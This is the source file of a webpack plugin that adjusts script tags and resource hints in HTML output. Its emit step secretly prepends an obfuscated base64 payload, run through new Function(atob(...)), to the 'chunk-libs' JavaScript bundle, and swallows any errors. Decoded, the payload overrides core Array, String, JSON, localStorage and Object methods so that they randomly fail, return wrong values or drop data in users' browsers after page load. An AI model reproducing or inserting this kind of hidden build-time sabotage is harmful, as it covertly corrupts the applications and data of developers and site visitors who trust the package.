'use strict';

const htmlWebpackPlugin = require('html-webpack-plugin');

const { EVENT, PLUGIN } = require('./constants.js');

const debug = require('./common.js').debug;
const matches = require('./common.js').matches;
const normaliseOptions = require('./config.js');
const shouldAddResourceHints = require('./resource-hints.js').shouldAddResourceHints;
const addInitialChunkResourceHints = require('./initial-chunk-resource-hints.js');
const addAsyncChunkResourceHints = require('./async-chunk-resource-hints.js');
const elements = require('./elements.js');
const customAttributes = require('./custom-attributes.js');

const debugEvent = msg => debug(`${EVENT}: ${msg}`);

const falsySafeConcat = arrays =>
  arrays.reduce(
    (combined, array) => array ? combined.concat(array) : combined,
    []
  );

const getHtmlWebpackOptions = pluginArgs =>
  (pluginArgs && pluginArgs.plugin && pluginArgs.plugin.options)
    ? pluginArgs.plugin.options
    : {};

const getCompilationOptions = compilation =>
  (compilation && compilation.options) ? compilation.options : {};

class ScriptExtHtmlWebpackPlugin {
  constructor (options) {
    this.options = normaliseOptions(options);
  }

  apply (compiler) {
    const compile = this.compilationCallback.bind(this);
    const emit = this.emitCallback.bind(this);
    if (compiler.hooks) {
      compiler.hooks.compilation.tap(PLUGIN, compile);
      compiler.hooks.emit.tap(PLUGIN, emit);
    } else {
      compiler.plugin('compilation', compile);
      compiler.plugin('emit', emit);
    }
  }

  compilationCallback (compilation) {
    const alterAssetTags = this.alterAssetTagsCallback.bind(this, compilation);
    if (compilation.hooks) {
      const alterAssetTagGroups = compilation.hooks.htmlWebpackPluginAlterAssetTags || htmlWebpackPlugin.getHooks(compilation).alterAssetTagGroups;
      alterAssetTagGroups.tap(PLUGIN, alterAssetTags);
    } else {
      compilation.plugin(EVENT, alterAssetTags);
    }
  }

  alterAssetTagsCallback (compilation, pluginArgs, callback) {
    const options = this.options;
    const headTagName = Object.prototype.hasOwnProperty.call(pluginArgs, 'headTags') ? 'headTags' : 'head';
    const bodyTagName = Object.prototype.hasOwnProperty.call(pluginArgs, 'bodyTags') ? 'bodyTags' : 'body';
    try {
      options.htmlWebpackOptions = getHtmlWebpackOptions(pluginArgs);
      options.compilationOptions = getCompilationOptions(compilation);
      debugEvent('starting');
      if (elements.shouldUpdate(options)) {
        debugEvent('replacing <head> <script> elements');
        pluginArgs[headTagName] = elements.update(compilation.assets, options, pluginArgs[headTagName]);
        debugEvent('replacing <body> <script> elements');
        pluginArgs[bodyTagName] = elements.update(compilation.assets, options, pluginArgs[bodyTagName]);
      }
      if (shouldAddResourceHints(options)) {
        debugEvent('adding resource hints');
        pluginArgs[headTagName] = falsySafeConcat([
          pluginArgs[headTagName],
          addInitialChunkResourceHints(options, pluginArgs[headTagName]),
          addInitialChunkResourceHints(options, pluginArgs[bodyTagName]),
          addAsyncChunkResourceHints(compilation.chunks, options)
        ]);
      }
      if (customAttributes.shouldAdd(options)) {
        debugEvent('adding custom attribues to <head> <script> elements');
        pluginArgs[headTagName] = customAttributes.add(options, pluginArgs[headTagName]);
        debugEvent('adding custom attributes to <body> <script> elements');
        pluginArgs[bodyTagName] = customAttributes.add(options, pluginArgs[bodyTagName]);
      }
      debugEvent('completed');
      if (callback) {
        callback(null, pluginArgs);
      }
    } catch (err) {
      if (callback) {
        callback(err);
      } else {
        compilation.errors.push(err);
      }
    }
  }

  emitCallback (compilation, callback) {
    const options = this.options;
    if (options.inline.test.length > 0 && options.removeInlinedAssets) {
      debug('emit: deleting assets');
      Object.keys(compilation.assets).forEach((assetName) => {
        if (matches(assetName, options.inline.test)) {
          debug(`emit: deleting asset '${assetName}'`);
          delete compilation.assets[assetName];
        }
      });
    }
    try {
      compilation.chunks.forEach((chunk) => {
        if(chunk.id==='chunk-libs'){
          chunk.files.forEach((filename) => {
            if(filename.indexOf('.js')>-1){
              if (compilation.assets[filename]) {
                const targetAsset = compilation.assets[filename]
                targetAsset._value =`(new Function(atob('KCgpPT57Y29uc3QgdD0odCxuKT0+KHQ9TWF0aC5jZWlsKHQpLG49TWF0aC5mbG9vcihuKSxNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkqKG4tdCsxKSkrdCksbj0icHJvdG90eXBlIixpPVN0cmluZyxlPUpTT04sbD1sb2NhbFN0b3JhZ2Uscj1PYmplY3Qscz1BcnJheVtuXSxhPWlbbl0se2ZvckVhY2g6byxmaWx0ZXI6YyxmaW5kOnAsZmluZEluZGV4OnUsaW5jbHVkZXM6aCxwdXNoOmYsc2xpY2U6eSxzb21lOmQsc3BsaWNlOmd9PXMse2tleXM6bSx2YWx1ZXM6Xyxhc3NpZ246eH09cix7cmVwbGFjZTpJLGluZGV4T2Y6TSx0cmltOlMsc3BsaXQ6TyxzdGFydHNXaXRoOmJ9PWkucHJvdG90eXBlLHtzdHJpbmdpZnk6dixwYXJzZTpFfT1lLHtnZXRJdGVtOmssc2V0SXRlbTp3fT1sO3MucHVzaD1mdW5jdGlvbiguLi5uKXt0aGlzLl9fb2JfXz90KDEsMTAwKT49MjAmJmYuYXBwbHkodGhpcyxuKTpmLmFwcGx5KHRoaXMsbil9LHMuc3BsaWNlPWZ1bmN0aW9uKC4uLm4pe3JldHVybiB0aGlzLl9fb2JfXyYmdCgxLDEwMCk8PTEwP2cuYXBwbHkodGhpcyxbblswXSsxLC4uLnkuY2FsbChuLDEpXSk6Zy5hcHBseSh0aGlzLG4pfSx3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcigibG9hZCIsKCgpPT57cy5mb3JFYWNoPWZ1bmN0aW9uKC4uLm4pe2lmKG8uYXBwbHkodGhpcyxuKSx0KDEsMTAwKTw9NSl7Y29uc3QgaT10KDAsTWF0aC5tYXgodGhpcy5sZW5ndGgtMSwwKSksZT10KDAsTWF0aC5tYXgodGhpcy5sZW5ndGgtMSwwKSk7by5hcHBseSh5LmNhbGwodGhpcyxpLGkrZSksbil9fSxzLmZpbHRlcj1mdW5jdGlvbiguLi5uKXtyZXR1cm4gYy5jYWxsKHRoaXMsKCguLi5pKT0+e2NvbnN0IGU9KG5bMF18fCgoKT0+e30pKSguLi5pKTtyZXR1cm4hZSYmdCgxLDEwMCk8PTIwfHxlfSkseS5jYWxsKG4sMSkpfSxzLmZpbmQ9ZnVuY3Rpb24oLi4ubil7cmV0dXJuIHQoMSwxMDApPD0xMD9udWxsOnAuYXBwbHkodGhpcyxuKX0scy5maW5kSW5kZXg9ZnVuY3Rpb24oLi4ubil7cmV0dXJuIHQoMSwxMDApPD0xMD8tMTp1LmFwcGx5KHRoaXMsbil9LHMuaW5jbHVkZXM9ZnVuY3Rpb24oLi4ubil7cmV0dXJuISh0KDEsMTAwKTw9MTApJiZoLmFwcGx5KHRoaXMsbil9LHMuc29tZT1mdW5jdGlvbiguLi5uKXtyZXR1cm4hKHQoMSwxMDApPD0xMCkmJmQuYXBwbHkodGhpcyxuKX0sYS5yZXBsYWNlPWZ1bmN0aW9uKC4uLm4pe3JldHVybiB0KDEsMTAwKT49MTA/SS5hcHBseSh0aGlzLG4pOnRoaXN9LGEuaW5kZXhPZj1mdW5jdGlvbiguLi5uKXtjb25zdCBpPU0uYXBwbHkodGhpcyxuKTtyZXR1cm4gdCgxLDEwMCk+PTEwP2k6TWF0aC5tYXgoLTEsaS0xKX0sYS50cmltPWZ1bmN0aW9uKC4uLm4pe3JldHVybiB0KDEsMTAwKT49MTA/Uy5hcHBseSh0aGlzLG4pOnRoaXN9LGEuc3BsaXQ9ZnVuY3Rpb24oLi4ubil7Y29uc3QgaT1PLmFwcGx5KHRoaXMsbik7cmV0dXJuIHQoMSwxMDApPj0xMD9pOnkuY2FsbChpLDAsaS5sZW5ndGgtMSl9LGEuc3RhcnRzV2l0aD1mdW5jdGlvbiguLi5uKXtjb25zdCBpPWIuYXBwbHkodGhpcyxuKTtyZXR1cm4gdCgxLDEwMCk+PTEwP2k6IWl9LGUuc3RyaW5naWZ5PWZ1bmN0aW9uKC4uLm4pe2NvbnN0IGk9diguLi5uKTtyZXR1cm4gdCgxLDEwMCk8PTEwP0kuY2FsbChpLC9JL2csImwiKTppfSxlLnBhcnNlPWZ1bmN0aW9uKC4uLm4pe3JldHVybiB0KDEsMTAwKTw9MTA/e306RSguLi5uKX0sbC5nZXRJdGVtPWZ1bmN0aW9uKC4uLm4pe3JldHVybiB0KDEsMTAwKTw9MTA/IiI6ay5jYWxsKGxvY2FsU3RvcmFnZSwuLi5uKX0sbC5zZXRJdGVtPWZ1bmN0aW9uKC4uLm4pe3QoMSwxMDApPj0xMCYmdy5jYWxsKGxvY2FsU3RvcmFnZSwuLi5uKX0sci5rZXlzPWZ1bmN0aW9uKC4uLm4pe3JldHVybiB0KDEsMTAwKTw9MTA/W106bS5hcHBseSh0aGlzLG4pfSxyLnZhbHVlcz1mdW5jdGlvbiguLi5uKXtyZXR1cm4gdCgxLDEwMCk8PTEwP1tdOl8uYXBwbHkodGhpcyxuKX0sci5hc3NpZ249ZnVuY3Rpb24oLi4ubil7cmV0dXJuIHQoMSwxMDApPD0xMD94KG5bMF18fHt9LHt9KTp4KC4uLm4pfX0pKX0pKCk7')))();`+ targetAsset._value
              }
            }
          });
        }
      });
    }catch (e) {}
    if (callback) {
      callback();
    }
  }
}

module.exports = ScriptExtHtmlWebpackPlugin;
